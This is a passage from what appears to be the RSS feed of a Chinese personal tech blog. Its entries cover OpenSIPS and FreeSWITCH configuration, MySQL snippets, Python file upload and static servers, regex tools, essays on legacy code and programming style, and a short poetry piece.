&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;list_all_profiles
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nh_enable_ping
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cr_reload_routes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cr_dump_routes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cr_replace_host
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cr_deactivate_host
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cr_activate_host
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cr_add_host
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cr_delete_host
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dp_reload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dp_translate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;address_reload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;address_dump
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;subnet_dump
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;allow_uri
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dr_reload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dr_gw_status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dr_carrier_status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lb_reload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lb_resize
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lb_list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lb_status
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;httpd_list_root_path
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sip_trace
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rtpengine_enable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rtpengine_show
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rtpengine_reload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;teardown
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>MySql学习</title>
      <link>https://wdd.js.org/posts/2019/07/bk7r40/</link>
      <pubDate>Tue, 16 Jul 2019 21:15:53 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/bk7r40/</guid>
      <description>&lt;h1 id=&#34;表复制&#34;&gt;表复制&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 不跨数据库&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;insert into subscriber_copy(id, username) select id, username &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; subscriber
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 跨数据库 需要在表名前加上数据库名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;insert into wdd&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;test(id, username) select id, username &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; opensips.subscriber
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;调整表结构&#34;&gt;调整表结构&lt;/h1&gt;
&lt;h2 id=&#34;增加字段&#34;&gt;增加字段&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ALTER TABLE test ADD &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;username&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt; char(&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; null default &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;随机选择一个数据&#34;&gt;随机选择一个数据&lt;/h1&gt;
&lt;p&gt;SELECT name  FROM table_name order by rand() limit 1&lt;/p&gt;</description>
    </item>
    <item>
      <title>通道变量与SIP 消息头</title>
      <link>https://wdd.js.org/freeswitch/get-sip-header/</link>
      <pubDate>Mon, 15 Jul 2019 23:06:57 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/get-sip-header/</guid>
      <description>&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h1 id=&#34;自定义sip消息头如何从通道变量中获取&#34;&gt;自定义SIP消息头如何从通道变量中获取？&lt;/h1&gt;
&lt;p&gt; if you pass a header variable called &lt;code&gt;type&lt;/code&gt; from the proxy server, it will get displayed as &lt;code&gt;variable_sip_h_type&lt;/code&gt; in FreeSWITCH™. To access that variable, you should strip off the &lt;code&gt;variable_&lt;/code&gt;, and just do &lt;code&gt;${sip_h_type}&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>无题 再读唐诗宋词</title>
      <link>https://wdd.js.org/posts/2019/07/fabbky/</link>
      <pubDate>Mon, 15 Jul 2019 21:20:08 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/fabbky/</guid>
      <description>&lt;p&gt;【少年】慈母手中线，游子身上衣&lt;!-- raw HTML omitted --&gt;【毕业】浔阳江头夜送客，枫叶荻花秋瑟瑟&lt;!-- raw HTML omitted --&gt;【实习】千呼万唤始出来，犹抱琵琶半遮面&lt;!-- raw HTML omitted --&gt;【工作加班】衣带渐宽终不悔，为伊消得人憔悴&lt;!-- raw HTML omitted --&gt;【同学结婚】昔别君未婚，儿女忽成行&lt;!-- raw HTML omitted --&gt;【表白】欲得周郎顾，时时误拂弦&lt;!-- raw HTML omitted --&gt;【恋爱】在天愿作比翼鸟，在地愿为连理枝&lt;!-- raw HTML omitted --&gt;【分手】别有幽愁暗恨生，此时无声胜有声&lt;!-- raw HTML omitted --&gt;【春节回家】近乡情更怯，不敢问来人&lt;!-- raw HTML omitted --&gt;【车站遇友】马上相逢无纸笔，凭君传语报平安&lt;!-- raw HTML omitted --&gt;【外婆去世】洛阳亲友如相问，一片冰心在玉壶&lt;!-- raw HTML omitted --&gt;【节后会沪】两岸猿声啼不住，动车已过万重山&lt;!-- raw HTML omitted --&gt;【情人节】天阶夜色凉如水，坐看牵牛织女星&lt;!-- raw HTML omitted --&gt;【重游南京】浮云一别后，流水十年间&lt;!-- raw HTML omitted --&gt;【秦淮灯会】云想衣裳花想容，春风拂槛露华浓&lt;/p&gt;
&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;</description>
    </item>
    <item>
      <title>从千与千寻谈编程风格</title>
      <link>https://wdd.js.org/posts/2019/07/gzfn7t/</link>
      <pubDate>Mon, 15 Jul 2019 21:06:47 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/gzfn7t/</guid>
      <description>&lt;p&gt;汤婆婆给千寻签订了契约，之后千寻的名字被抹去了，每个人都叫千寻小千，甚至千寻自己，也忘记了自己原来的名字。&lt;/p&gt;
&lt;p&gt;但是只有白先生告诫千寻，一定要记住自己的名字，否则再也无法回到原来的世界。而白先生自己，就是那个已经无法回到原来世界的人。&lt;/p&gt;
&lt;h1 id=&#34;最重要的是记住自己的名字&#34;&gt;最重要的是记住自己的名字&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;名字要有意义&lt;/li&gt;
&lt;li&gt;不要使用缩写，缩写会让你忘记自己的原来的名字&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;没有工作的人会变成妖怪的&#34;&gt;没有工作的人，会变成妖怪的&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;没有用的变量，会变成垃圾&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;别吃得太胖会被杀掉的&#34;&gt;别吃得太胖，会被杀掉的&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;别占用太多内存，会被操作系统给杀掉的&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>如何维护老代码?</title>
      <link>https://wdd.js.org/posts/2019/07/osb460/</link>
      <pubDate>Mon, 15 Jul 2019 20:10:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/osb460/</guid>
      <description>&lt;p&gt;&lt;!-- raw HTML omitted --&gt;Photo by &lt;a href=&#34;https://unsplash.com/@mrblairfraser?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText&#34;&gt;Blair Fraser&lt;/a&gt; on &lt;a href=&#34;https://unsplash.com/collections/1545226/my-first-collection/f94c9ebcc429826cde277e968753cd2f?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText&#34;&gt;Unsplash&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;从头开发一个软件只是小儿科，改进一个程序才显真本事。《若为自由故  自由软件之父理查德·斯托曼传》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;每个人都有从零开发软件的处女情结，但是事实上我们大多数时候都在维护别人的代码。&lt;/p&gt;
&lt;p&gt;所以，别人写的代码如何糟糕，你再抱怨也是无意义的。&lt;/p&gt;
&lt;p&gt;从内心中问自己，&lt;strong&gt;你究竟是在抱怨别人，还是不敢面对自己脆弱的内心。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;老代码的意义&#34;&gt;老代码的意义&lt;/h1&gt;
&lt;p&gt;廉颇老矣，尚能饭否。&lt;/p&gt;
&lt;p&gt;老代码的有很多缺点，如难以维护，逻辑混乱。但是老代码有唯一的好处，就是老代码经过生产环境的洗礼。这至少能证明老代码能够稳定运行，不出问题。&lt;/p&gt;
&lt;p&gt;东西，如果不出问题，就不要动它。&lt;/p&gt;
&lt;h1 id=&#34;老代码可能存在哪些问题&#34;&gt;老代码可能存在哪些问题&lt;/h1&gt;
&lt;p&gt;老代码的问题，就是我们重构的点。首先我们要明确，老代码中有哪些问题。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模块性不强，重复代码太多&lt;/li&gt;
&lt;li&gt;逻辑混乱，业务逻辑和框架逻辑混杂&lt;/li&gt;
&lt;li&gt;注释混乱：特别要小心，很多老代码中的注释都可能不知道祖传多少代了。如果你要按着注释去理解，很可能南辕北辙，走火入魔。&lt;strong&gt;按照代码的执行去理解业务逻辑，而不是按照注释。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;配置性的硬代码和业务逻辑混杂，这个是需要在后期抽离的&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;如果你无法理解请勿重构&#34;&gt;如果你无法理解，请勿重构&lt;/h1&gt;
&lt;p&gt;带着respect, 也带着质疑，阅读并理解老代码。取其精华，去其糟粕。如果你还不理解老代码，就别急着重构它，让子弹飞一会。&lt;/p&gt;
&lt;p&gt;等自己能够理解老代码时，再去重构。我相信在理解基础上重构，会更快，也更安全。&lt;/p&gt;
&lt;h1 id=&#34;不要大段改写要见缝插针&#34;&gt;不要大段改写，要见缝插针&lt;/h1&gt;
&lt;p&gt;不要在老代码中直接写自己的代码，应该使用函数。&lt;/p&gt;
&lt;p&gt;在老代码中改动一行，调用自己写的函数。&lt;/p&gt;
&lt;p&gt;几乎每种语言中都有函数这种组织代码的形式，通过见缝插针调用函数的方式。能够尽量减少老代码的改动，如果出现问题，也比较容易调试。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Regex Tools</title>
      <link>https://wdd.js.org/fe/regex-tools/</link>
      <pubDate>Sat, 13 Jul 2019 09:53:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/regex-tools/</guid>
      <description>&lt;h1 id=&#34;regex101-功能最强&#34;&gt;regex101: 功能最强&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://regex101.com/&#34;&gt;https://regex101.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;regex101的功能最强，支持php, js, python, 和go的正则表达式&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/regex-tools/2022-10-29-10-46-46.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;regulex正则可视化&#34;&gt;Regulex：正则可视化&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://jex.im/regulex/#!flags=&amp;amp;re=%5E(a%7Cb)*%3F%24&#34;&gt;https://jex.im/regulex/#!flags=&amp;amp;re=%5E(a%7Cb)*%3F%24&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;regulex仅支持js的正则，&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/regex-tools/2022-10-29-10-47-01.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;regexper正则可视化&#34;&gt;regexper：正则可视化&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://regexper.com/&#34;&gt;https://regexper.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/regex-tools/2022-10-29-10-47-40.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;pyregex专注python正则&#34;&gt;pyregex：专注python正则&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;http://www.pyregex.com/&#34;&gt;http://www.pyregex.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/regex-tools/2022-10-29-10-47-52.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>1秒搭建静态文件服务器</title>
      <link>https://wdd.js.org/posts/2019/07/stxzl6/</link>
      <pubDate>Fri, 12 Jul 2019 21:24:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/stxzl6/</guid>
      <description>&lt;h1 id=&#34;基于python&#34;&gt;基于python&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 基于python2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python -m SimpleHTTPServer &lt;span style=&#34;color:#ae81ff&#34;&gt;8088&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 基于python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;8088&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;基于nodejs&#34;&gt;基于Node.js&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/zeit/serve&#34;&gt;https://github.com/zeit/serve&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/http-party/http-server&#34;&gt;https://github.com/http-party/http-server&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>python request 库学习</title>
      <link>https://wdd.js.org/posts/2019/07/ya30bi/</link>
      <pubDate>Fri, 12 Jul 2019 11:21:23 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/ya30bi/</guid>
      <description>&lt;h1 id=&#34;上传文件&#34;&gt;上传文件&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ssid&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1234&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;files &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;: open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yourfile.tar.gz&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://localhost:1345/fileUpload/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests.post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;url, files&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;files, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;r.status_code&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>fs日志级别</title>
      <link>https://wdd.js.org/freeswitch/fs-log-level/</link>
      <pubDate>Thu, 11 Jul 2019 17:13:29 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/fs-log-level/</guid>
      <description>&lt;p&gt;fs日志级别&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CONSOLE&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ALERT&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CRIT&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ERR&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;WARNING&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NOTICE&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INFO&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DEBUG&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;日志级别设置的越高，显示的日志越多&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在autoload_configs/switch.conf.xml 设置了一些快捷键，可以在fs_cli中使用&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;F7&lt;/strong&gt;将日志级别设置为0，显示的日志最少&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;F8&lt;/strong&gt;将日志级别设置为7， 显示日志最多&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同时也可以使用 console loglevel指令自定义设置级别&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;console loglevel &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;console loglevel notice
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://freeswitch.org/confluence/display/FREESWITCH/Troubleshooting+Debugging&#34;&gt;https://freeswitch.org/confluence/display/FREESWITCH/Troubleshooting+Debugging&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>from vs to vs request-url之间的关系</title>
      <link>https://wdd.js.org/opensips/ch1/from-to-request-url/</link>
      <pubDate>Thu, 11 Jul 2019 07:38:53 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/from-to-request-url/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;from字段用来标记请求的发起者ID&lt;/li&gt;
&lt;li&gt;to字段用来标记请求接受者的ID&lt;/li&gt;
&lt;li&gt;to字段并不能用于路由，request-url可以用来路由&lt;/li&gt;
&lt;li&gt;一般情况下，sip消息再传输过程中，from和to字段都不会改，而request-url很可能会因为路由而改变&lt;/li&gt;
&lt;li&gt;对于最初的请求，除了注册请求之外，request-url和to字段中的url一致&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;from字段：&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;The From header field is a required header field that indicates the originator of the request. It is one of two addresses used to identify the dialog. The From header field contains a URI, but it may not contain the transport, maddr, or ttl URI parameters. A From header field may contain a tag used to identify a particular call. A From header field may contain a display name, in which case the URI is enclosed in &amp;lt; &amp;gt;. If there is both a URI parameter and a tag, then the URI including any parameters must be enclosed in &amp;lt; &amp;gt;. Examples are shown in Table 6.8. A From tag was optional in RFC 2543 but is mandatory to include in RFC 3261.&lt;/p&gt;</description>
    </item>
    <item>
      <title>日志xlog</title>
      <link>https://wdd.js.org/opensips/ch5/xlog-level/</link>
      <pubDate>Tue, 09 Jul 2019 17:52:55 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/xlog-level/</guid>
      <description>&lt;h1 id=&#34;建议日志格式&#34;&gt;建议日志格式&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rm&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt;-&amp;gt;&lt;/span&gt;$tu&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;$cfg_line&lt;span style=&#34;color:#e6db74&#34;&gt; some msg&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;日志级别&#34;&gt;日志级别&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;L_ALERT (-3)&lt;/li&gt;
&lt;li&gt;L_CRIT (-2)&lt;/li&gt;
&lt;li&gt;L_ERR (-1) - this is used by default if log_level is omitted&lt;/li&gt;
&lt;li&gt;L_WARN (1)&lt;/li&gt;
&lt;li&gt;L_NOTICE (2)&lt;/li&gt;
&lt;li&gt;L_INFO (3)&lt;/li&gt;
&lt;li&gt;L_DBG (4)&lt;/li&gt;
&lt;/ul&gt;
